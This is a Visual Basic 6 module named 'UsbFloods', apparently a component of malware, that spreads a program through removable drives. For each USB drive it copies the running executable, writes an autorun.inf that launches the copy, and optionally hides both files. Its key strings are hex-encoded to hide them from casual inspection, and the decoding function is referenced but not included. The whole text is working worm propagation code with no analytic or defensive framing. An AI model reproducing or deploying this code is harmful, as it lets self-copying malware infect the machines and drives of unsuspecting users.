Attribute VB_Name = "UsbFloods"
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Private Declare Function SetFileAttributes Lib "kernel32" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hHandle As Long) As Long

Const DRIVE_REMOVABLE = 2
Const FILE_ATTRIBUTE_HIDDEN = 2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const OPEN_ALWAYS = 4
Const GENERIC_WRITE = &H40000000
Const FILE_SHARE_WRITE = &H2

Public Function SubExFloods(Filename As String, Hide As Boolean) As Long
    Dim szBuffer As String * 128
    Dim Drive As Variant
    Dim Drives() As String
    hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer)
    If hGet <> 0 Then
        Drives = Split(szBuffer, Chr(0))
        For Each Drive In Drives
            If GetDriveType(Drive) = DRIVE_REMOVABLE Then
                If CopyToFile(GetFilename, Drive & Filename) = True Then
                    If WriteToFile(Drive & Desencriptar("6175746F72756E2E696E66"), _
                        Desencriptar("5B6175746F72756E5D") & vbCrLf & Desencriptar("6F70656E3D") & Drive & Filename) = True Then
                        If Hide = True Then
                           SetFileAttributes Drive & Desencriptar("6175746F72756E2E696E66"), FILE_ATTRIBUTE_HIDDEN
                           SetFileAttributes Drive & Filename, FILE_ATTRIBUTE_HIDDEN
                        End If
                        SubExFloods = SubExFloods + 1
                    End If
                End If
            End If
        Next Drive
    End If
End Function

Public Function GetFilename() As String
    Dim szBuffer As String * 255
    GetModuleFileName 0, szBuffer, Len(szBuffer)
    GetFilename = szBuffer
End Function

Public Function CopyToFile(Filename As String, Newname As String) As Boolean
    hCopy = CopyFile(Filename, Newname, 0)
    If hCopy <> 0 Then
        CopyToFile = True 'success
    End If
End Function

Public Function WriteToFile(Filename As String, Buffer As String) As Boolean
    hFile = CreateFile(Filename, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    If hFile <> 0 Then
        hWrite = WriteFile(hFile, Buffer, Len(Buffer), 0, 0)
        If hWrite <> 0 Then
            WriteToFile = True 'success
        End If
    End If
    CloseHandle (hFile)
End Function


